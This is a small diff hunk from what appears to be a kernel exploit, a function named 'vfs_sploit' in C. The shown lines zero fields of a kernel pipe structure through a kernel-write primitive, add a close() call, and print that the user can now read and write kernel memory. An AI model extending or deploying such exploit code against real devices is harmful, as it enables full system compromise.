@@ -1044,7 +1044,8 @@ void vfs_sploit() {
   wk64(pipe + 0x00, 0);
   wk64(pipe + 0x08, 0);
   wk64(pipe + 0x10, 0);
-
+  close(vfs_fd);
+  
   printf("done!\n");
   
   printf("use the functions in kmem.h to read and write kernel memory\n");
